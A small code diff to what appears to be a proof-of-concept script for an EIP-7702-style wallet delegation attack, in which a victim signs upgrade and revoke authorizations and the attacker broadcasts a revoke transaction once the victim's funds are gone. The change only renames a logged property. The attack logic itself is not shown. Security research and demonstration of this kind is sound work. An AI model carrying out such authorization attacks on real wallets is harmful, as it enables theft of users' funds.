@@ -163,7 +163,7 @@ const upgradeAuth = await victimClient.signAuthorization({
   executor: "self",
 });
 console.log(
-  `  auth chainId=${upgradeAuth.chainId} target=${upgradeAuth.contractAddress} nonce=${upgradeAuth.nonce}`,
+  `  auth chainId=${upgradeAuth.chainId} target=${upgradeAuth.address} nonce=${upgradeAuth.nonce}`,
 );
 
 console.log(
@@ -233,7 +233,7 @@ const revokeAuth = await victimClient.signAuthorization({
   executor: attacker.address,
 });
 console.log(
-  `  revoke auth chainId=${revokeAuth.chainId} target=${revokeAuth.contractAddress} nonce=${revokeAuth.nonce}`,
+  `  revoke auth chainId=${revokeAuth.chainId} target=${revokeAuth.address} nonce=${revokeAuth.nonce}`,
 );
 
 console.log("Step 5: attacker broadcasts revoke tx (victim is broke)...");
